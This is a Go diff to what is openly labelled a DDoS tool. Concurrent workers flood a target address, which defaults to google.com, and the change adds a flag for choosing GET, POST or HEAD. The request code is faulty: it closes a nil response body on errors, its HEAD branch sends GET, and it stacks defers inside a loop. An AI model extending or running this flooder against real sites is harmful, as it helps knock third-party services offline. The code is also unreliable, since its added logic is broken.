@@ -23,9 +23,11 @@ type Worker struct {
 
 func main() {
 	var numThreads, numJobs, workTime int
+	var method string
 	flag.IntVar(&numThreads, "c", 1, "number of threads")
 	flag.IntVar(&numJobs, "n", 1, "number of requests")
 	flag.IntVar(&workTime, "t", 1, "time of work in seconds")
+	flag.StringVar(&method, "m", "GET", "http method for request")
 
 	var addr string
 	flag.StringVar(&addr, "a", "https://google.com", "address for DDoS")
@@ -56,7 +58,8 @@ func main() {
 			numJobs++ //если был задан флаг на время выполнения, а не количество запросов, то в течении этого времени плодятся новые джобы
 		}
 		jobChan <- &Job{
-			addr: addr,
+			addr:   addr,
+			method: method,
 		}
 	}
 
@@ -79,14 +82,34 @@ func (w *Worker) HandleDDoS(addr string) {
 	defer w.wg.Done()
 	start := time.Now()
 	for job := range w.jobChan {
-		resp, err := http.Get(addr)
-		if err != nil {
-			fmt.Println(err)
-			continue
+		switch job.method {
+		case "POST":
+			resp, err := http.Post(addr, http.DetectContentType(nil), nil)
+			if err != nil {
+				fmt.Println(err)
+				defer resp.Body.Close()
+				continue
+			}
+
+		case "HEAD":
+			resp, err := http.Get(addr)
+			if err != nil {
+				fmt.Println(err)
+				defer resp.Body.Close()
+				continue
+			}
+		default:
+			job.method = "GET"
+			resp, err := http.Get(addr)
+			if err != nil {
+				fmt.Println(err)
+				defer resp.Body.Close()
+				continue
+			}
+
 		}
 
-		log.Printf("worker %d ping %s with time %d", w.num, job.addr, time.Since(start).Milliseconds())
-		defer resp.Body.Close()
+		log.Printf("worker %d ping %s with time %d and method %s", w.num, job.addr, time.Since(start).Milliseconds(), job.method)
 	}
 }
 
